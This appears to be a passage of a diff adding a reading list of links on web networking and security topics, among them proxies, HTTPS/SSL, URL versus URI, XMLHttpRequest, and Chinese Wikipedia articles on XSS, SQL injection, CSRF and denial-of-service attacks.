+- [Proxy server](https://en.wikipedia.org/wiki/Proxy_server)
+- [What Is This HTTPS/SSL Thing And Why Should You Care?](https://www.x-cart.com/blog/what-is-https-and-ssl.html)
+- [What is SSL Offloading?](https://securebox.comodo.com/ssl-sniffing/ssl-offloading/)
+- [Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption](https://docs.oracle.com/cd/E19424-01/820-4811/6ng8i26bn/index.html)
+- [An Introduction to Mutual SSL Authentication](https://www.codeproject.com/Articles/326574/An-Introduction-to-Mutual-SSL-Authentication)
+- [The Difference Between URLs and URIs](https://danielmiessler.com/study/url-uri/)
 - [维基百科：跨站脚本](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)
 - [维基百科：SQL 注入攻击](https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A)
 - [维基百科：跨站点请求伪造](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
 - [维基百科：拒绝服务攻击](https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A)
+- [What is the difference between a URI, a URL and a URN?](https://stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn)
+- [XMLHttpRequest](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest)
+- [XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST?](https://blog.josephscott.org/2009/08/27/xmlhttprequest-xhr-uses-multiple-packets-for-http-post/)
